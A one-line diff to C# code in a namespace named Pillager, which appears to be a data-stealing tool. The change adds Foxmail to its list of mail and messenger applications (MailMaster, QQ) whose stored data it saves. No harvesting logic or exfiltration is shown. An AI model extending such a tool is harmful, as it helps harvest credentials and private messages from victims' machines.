@@ -35,6 +35,7 @@ namespace Pillager
 
             //Mail
             MailMaster.Save(savepath);
+            Foxmail.Save(savepath);
 
             //Messengers
             QQ.Save(savepath);
